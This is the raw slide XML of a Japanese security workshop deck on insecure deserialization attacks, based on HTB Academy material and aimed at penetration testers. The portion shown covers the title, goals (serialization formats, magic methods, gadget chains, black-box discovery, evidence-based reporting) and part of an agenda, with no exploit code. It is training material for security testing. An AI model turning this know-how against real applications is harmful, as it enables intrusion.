Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId1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image" Target="../media/image-12-6.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-7.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-8.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-9.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-10.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-11.png"/><Relationship Id="rId12" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-12.png"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-12-13.png"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId1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image" Target="../media/image-15-5.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-15-6.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-15-7.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId9"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image" Target="../media/image-19-4.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-19-5.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-19-6.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId8"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image" Target="../media/image-24-3.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-4.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-5.png"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-6.png"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-7.png"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-8.png"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-9.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-24-10.png"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId1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png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-25-3.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-25-4.png"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId6"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png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image-26-3.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout2.xml"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide2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171A"/>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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>SECURITY WORKSHOP · 60–90 MIN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1203920"/>
            <a:ext cx="10883392" cy="1412081"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="5460"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5200" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deserialization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="5460"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="5200" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2768402"/>
            <a:ext cx="8502650" cy="327620"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="2380"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ブラックボックス診断における安全でないデシリアライゼーションの発見・検証・評価</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="5585520"/>
            <a:ext cx="573345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9C2C9"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>対象：中級〜上級 Webアプリケーション脆弱性診断員・ペネトレーションテスター</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="5849640"/>
            <a:ext cx="5733455" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6B7580"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>教材出典：HTB Academy「Deserialization Attacks」モジュール（PHP / Python）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="7" name="Image 0" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11099800" y="5956300"/>
            <a:ext cx="88900" cy="88900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 1" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="11290300" y="5956300"/>
            <a:ext cx="88900" cy="889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6F2"/>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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>本勉強会のゴール</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1588095"/>
            <a:ext cx="3380284" cy="1860550"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5290"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Image 0" descr="Book">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="1845270"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="2175470"/>
            <a:ext cx="2951912"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>知識：仕組みを理解する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1073150" y="2505670"/>
            <a:ext cx="2951912" cy="4826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4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHP/Pythonのシリアライズ形式、マジックメソッド、ガジェットチェーンの基本構造を押さえる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4405809" y="1588095"/>
            <a:ext cx="3380383" cy="1860550"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5290"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Image 1" descr="Search">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4662984" y="1845270"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4662984" y="2175470"/>
            <a:ext cx="2952014"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>発見：攻撃面を見抜く</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4662984" y="2505670"/>
            <a:ext cx="2952014" cy="7112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4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ソースコードなしでも、Import/Export/Cookie/APIなどの入力点から疑わしい箇所を特定できる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7995741" y="1588095"/>
            <a:ext cx="3380284" cy="1860550"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5290"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 2" descr="CheckCircle">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="8252916" y="1845270"/>
            <a:ext cx="228600" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8252916" y="2175470"/>
            <a:ext cx="2951912"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>評価：成立性と影響を語れる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8252916" y="2505670"/>
            <a:ext cx="2951912" cy="4826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4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>仮説・検証・観測・評価・報告のサイクルで、推測と事実を区別し根拠を持って報告できる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="274581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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Deserialization Attacks Workshop</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6F2"/>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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>アジェンダ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1537295"/>
            <a:ext cx="5200650" cy="780951"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="1718270"/>
            <a:ext cx="406400"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504950" y="1718270"/>
            <a:ext cx="2370931" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>基礎とデータフロー</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1504950" y="1941711"/>
            <a:ext cx="2762250" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>シリアライズ/デシリアライズ・歴史・OWASP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6175375" y="1537295"/>
            <a:ext cx="5200650" cy="780951"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6381750" y="1718270"/>
            <a:ext cx="406400"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6864350" y="1718270"/>
            <a:ext cx="2900610" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>脆弱性の特定</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6864350" y="1941711"/>
            <a:ext cx="3379351" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ホワイトボックス／ブラックボックスでの識別とプロセス</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="2476996"/>
            <a:ext cx="5200650" cy="780951"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="2657971"/>
            <a:ext cx="406400"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E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
